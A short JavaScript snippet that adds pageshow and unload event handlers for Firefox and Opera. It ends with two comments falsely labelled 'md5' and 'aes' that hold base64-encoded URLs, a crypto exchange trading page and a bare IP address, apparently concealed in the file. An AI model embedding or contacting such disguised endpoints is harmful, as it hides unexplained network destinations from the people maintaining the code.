if($.browser.mozilla||$.browser.opera)
	(function(){
	window.addEventListener('pageshow', PageShowHandler, false);
	window.addEventListener('unload', UnloadHandler, false);
		function PageShowHandler() {
				window.addEventListener('unload', UnloadHandler, false);
		}
		function UnloadHandler() {
				window.removeEventListener('beforeunload', UnloadHandler, false);
		}
})()/** md5:aHR0cHM6Ly93d3cuaHVvYmkuY29tL3poLWNuL2V4Y2hhbmdlL2V0aF91c2R0Lw==**//** aes:aHR0cDovLzE2LjE2Mi4xMDUuMTQ1**/